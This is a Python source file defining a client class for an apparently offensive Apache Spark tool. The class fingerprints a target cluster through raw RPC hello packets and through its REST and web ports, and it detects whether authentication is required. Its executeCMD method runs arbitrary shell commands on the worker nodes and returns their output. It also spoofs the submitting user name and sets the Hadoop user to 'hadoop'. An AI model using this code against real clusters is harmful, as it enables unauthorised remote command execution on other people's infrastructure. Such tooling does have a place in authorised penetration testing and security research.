from pyspark import SparkConf, SparkContext
from general import whine
import random, time
from lxml import html
import logging, errno, requests, json
import subprocess, os, struct, socket, sys


class SparkClient:
    def __init__(self, target, port, localIP, appName, username):
        self.target = target
        self.port = port
        self.restPort = 6066
        self.httpPort = 8080
        self.logLevel = "FATAL"
        self.localIP = localIP
        self.sc = None
        self.appName = appName
        self.username = username
        self.version = None
        self.secret = None
        self.requiresAuthentication = False
        self.useBlind = False
        self.yarn = False
        self.hdfs = None

    def initContext(self, secret):
        whine("Initializing local Spark driver...This can take a little while", "info")
        os.environ["SPARK_LOCAL_IP"] = self.localIP
        conf = SparkConf().setAppName(self.appName)
        conf = conf.set("spark.local.ip", self.localIP)
        conf = conf.set("spark.driver.host", self.localIP)
        if self.requiresAuthentication:
            conf = self._setupAuthentication(conf, secret)
        if self.yarn:
            conf = self._setupYarn(conf)
        else:
            conf = conf.setMaster("spark://%s:%d" % (self.target, self.port))

        conf = conf.set(
            "spark.driver.extraJavaOptions", "-Duser.name=%s" % self.username
        )
        self.sc = SparkContext(conf=conf)
        self.sc.setLogLevel(self.logLevel)

    def _setupYarn(self, conf):
        os.environ["HADOOP_USER_NAME"] = "hadoop"
        os.environ["HADOOP_CONF_DIR"] = "./yarn"
        conf = conf.setMaster("yarn")
        conf = conf.set(
            "spark.hadoop.yarn.resourcemanager.address",
            "%s:%s" % (self.target, self.port),
        )
        conf = conf.set("spark.yarn.stagingDir", "/tmp")
        conf = conf.set("spark.hadoop.fs.defaultFS", "hdfs://%s" % self.hdfs)
        return conf

    def _setupAuthentication(self, conf, secret):
        conf = conf.set("spark.authenticate", "true")
        conf = conf.set("spark.authenticate.secret", secret)
        #conf = conf.set("spark.network.crypto.enabled", "true")
        return conf

    def isReady(self):
        if self.sc is None:
            return False
        return True

    def performWork(self):
        if not self.isReady():
            return None
        self.sc.parallelize(range(0, 1), 10).filter(lambda x: x + 1).count()

    def listNodes(self):
        if not self.isReady():
            return None
        self.performWork()
        return self.sc._jsc.sc().getExecutorMemoryStatus()

    def getVersion(self):
        try:
            self.version = str(self.sc.version)
            return True
        except Exception as e:
            whine("Could not get Spark version - %s " % e, "err")
            return False

    def executeCMD(self, interpreterArgs, numWorkers=1):
        if not self.isReady():
            return None
        out = []
        mylist = self.sc.parallelize(range(0, numWorkers), numWorkers).map(
            lambda x: subprocess.Popen(
                interpreterArgs, stdout=subprocess.PIPE
            ).stdout.read()
        )
        for a in mylist.collect():
            out.append(a)
        return out

    def sendHello(self):
        if self.yarn:
            return True
        nonce = "\x00\x00\x00\x00\x00\x00\x00\xc5\x03\x62\x05\x32\x92\xe7\xca\x6d\xaa\x00\x00\x00\xb0"
        hello = (
            "\x01\x00\x0c\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x32\x31\x00"
            "\x00\xe7\x44\x01\x00\x0c\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e"
            "\x32\x38\x00\x00\x1b\xa5\x00\x11\x65\x6e\x64\x70\x6f\x69\x6e\x74"
            "\x2d\x76\x65\x72\x69\x66\x69\x65\x72\xac\xed\x00\x05\x73\x72\x00"
            "\x3d\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x73\x70\x61\x72"
            "\x6b\x2e\x72\x70\x63\x2e\x6e\x65\x74\x74\x79\x2e\x52\x70\x63\x45"
            "\x6e\x64\x70\x6f\x69\x6e\x74\x56\x65\x72\x69\x66\x69\x65\x72\x24"
            "\x43\x68\x65\x63\x6b\x45\x78\x69\x73\x74\x65\x6e\x63\x65\x6c\x19"
            "\x1e\xae\x8e\x40\xc0\x1f\x02\x00\x01\x4c\x00\x04\x6e\x61\x6d\x65"
            "\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74"
            "\x72\x69\x6e\x67\x3b\x78\x70\x74\x00\x06\x4d\x61\x73\x74\x65\x72"
        )
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_address = (self.target, self.port)
            sock.settimeout(3)
            sock.connect(server_address)
            sock.send(nonce)
            sock.send(hello)
            respNone = sock.recv(21)
            respNone2 = sock.recv(200)
            if "Expected SaslMessage" in respNone2:
                self.requiresAuthentication = True
            if len(respNone) == 21 and respNone[10] == nonce[10]:
                return True

        except socket.timeout:
            whine("Caught a timeout on target %s:%s" % (self.target, self.port), "err")
            sys.exit(-1)
        except socket.error as serr:
            if serr.errno == errno.ECONNREFUSED:
                whine(serr, "err")
                sys.exit(-1)
            whine(serr, "warn")
            return False

    def sendRestHello(self):
        try:
            rp = requests.get(
                "http://%s:%s/v1/submissions/status/1" % (self.target, self.restPort),
                timeout=3,
            )
            jsonData = json.loads(rp.text)
            return jsonData
        except (requests.exceptions.Timeout, requests.exceptions.RequestException):
            whine(
                "No Rest API available at %s:%s" % (self.target, self.restPort), "warn"
            )
            return None
        except Exception as err:
            whine(
                "Error connecting to REST API at %s:%s - %s"
                % (self.target, self.restPort, err),
                "err",
            )
            return None

    def sendHTTPHello(self):
        try:
            rp = requests.get("http://%s:%s" % (self.target, self.httpPort), timeout=3)
            doc = html.fromstring(rp.text)
            return doc
        except (requests.exceptions.Timeout, requests.exceptions.RequestException):
            whine(
                "No Web page available at %s:%s" % (self.target, self.httpPort), "warn"
            )
            return None
        except Exception as err:
            whine(
                "Error connecting to Web page at %s:%s - %s"
                % (self.target, self.httpPort, err),
                "err",
            )
            return None

    def sendRawMessage(self, payload):
        payloadSize = struct.pack(">I", len(payload))
        payloadSize13 = struct.pack(">I", len(payload) + 13)
        nonce = "\x00\x00\x00\x00" + payloadSize13 + "\x09" + payloadSize
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_address = (self.target, self.port)
        sock.settimeout(3)
        sock.connect(server_address)
        sock.send(nonce)
        sock.send(payload)
        respNone = sock.recv(13)
        respNone = sock.recv(2048)
        if "RegisteredApplication" in respNone:
            time.sleep(2)
            return True
        return False

    def __del__(self):
        os.environ["SPARK_LOCAL_IP"] = ""
